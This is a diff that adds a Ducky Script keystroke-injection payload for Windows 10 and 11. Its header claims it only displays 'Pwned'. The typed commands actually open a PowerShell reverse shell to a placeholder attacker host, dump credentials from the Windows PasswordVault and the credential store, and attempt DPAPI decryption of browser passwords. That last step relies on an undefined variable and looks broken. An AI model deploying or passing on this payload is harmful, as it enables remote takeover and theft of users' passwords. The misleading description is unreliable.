@@ -1,0 +1,21 @@
+REM     Title: Garbage-Truck
+
+REM     Author: cbk914
+
+REM     Description: This payload is meant to show 'Pwned' on the target
+
+REM     Target: Windows 10, 11
+
+DELAY 1000
+GUI r
+STRING powershell -c "& {$client = New-Object System.Net.Sockets.TCPClient('attacker-host',attacker-port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }"
+ENTER
+DELAY 200
+STRING powershell -ExecutionPolicy Bypass -windowstyle hidden -noninteractive -c "& [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }"
+ENTER
+DELAY 200
+STRING powershell -c "& Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
+ENTER
+DELAY 200
+STRING powershell -c "& [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))"
+ENTER
